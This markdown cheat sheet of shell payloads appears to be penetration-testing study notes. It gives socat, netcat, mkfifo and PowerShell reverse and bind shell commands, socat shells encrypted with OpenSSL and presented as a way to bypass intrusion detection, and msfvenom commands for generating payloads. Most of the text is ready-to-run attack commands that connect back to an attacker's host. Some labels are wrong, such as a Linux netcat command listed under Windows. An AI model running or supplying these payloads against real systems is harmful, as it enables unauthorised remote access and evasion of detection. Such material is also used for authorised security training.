```bash

```

# Socat
Socat is similar to Netcat. It works as a connector between two points.

## Reverse Shells
### Syntax for A Listener/Attacker
* `socat TCP-L:<port> -` [ Two points (a listening port, and standard input) and connecting them together]
  
###  To Connect Back on A Windows Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` [The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.]
###  To Connect Back on A Linux Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells
### On A Linux Target
* `socat TCP-L:<PORT> EXEC:"bash -li"`
### On A Windows Target
* `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
### Attacker (Regardless of target platform)
* `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## A Fully Stable TTY Reverse Shell Using Socat
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
We are passing in the current TTY as a file and setting the echo to be zero

<br> <br> <br><br> <br> <br>
# Socat Encrypted Shells
Encryption helps us bypass IDS <br>
We Will use OPENSSL instead of TCP <br>
## Generate A Certificate
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
## Merge 2 files into one
```bash
cat shell.key shell.crt > shell.pem
```
## Set Up Reverse Shell Listener on Attacker
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
## To Connect Back on Target Machine
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## Blind Shell
### Target
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

### Attacker
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
------------------------------------------------------------------------------------------------------------------
<br> <br> <br><br> <br> <br>
# Common Shell Payloads
## Windows
### Bind Shell; Set Up A Listener
```bash
nc -lvnp <PORT> -e /bin/bash
```
### Reverse Shell; Connecting Back
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

## Linux
### Bind Shell; Create A Listener
```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Reverse Shell; Connecting Back
```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Create A PowerShell Reverse Shell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
* Replace the IP and port
* Will work on cmd.exe shell or webshell
<br> <br> <br><br> <br> <br>
# Msfvenom
Standard Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
<br>To generate a Windows x64 Reverse Shell in an exe format: <br>
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

## Payloads
* Staged: 2 Parts; 1. Small Stager (Creates Connection) & 2. Bulkier Reverse Shell Code downloaded later
* Stageless: Self-contained Payloads that immediately sends a shell back <br>
**NOTE:** Stageless Payloads are easier to send but easily discovered by AV. Staged Payloads are more efficient.

## Meterpreter
* Metasploit's Own Shells and they must be caught in metasploit
* Fully Stable
* Good for Windows Targets

## Payload Naming Conventions
Basic Convention: `<OS>/<arch>/<payload>` <br>
For example:
`linux/x86/shell_reverse_tcp` <br>
The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.: `windows/shell_reverse_tcp`

<br>
For a 64bit Windows target, the arch would be specified as normal (x64).

For Full List of Payloads:
```bash
msfvenom --list payloads
```

### Optional Read
In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
`shell/reverse_tcp`
<br>
As staged payloads are denoted with another forward slash (/).
<br>
This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this: `windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:
`linux/x86/meterpreter_reverse_tcp`
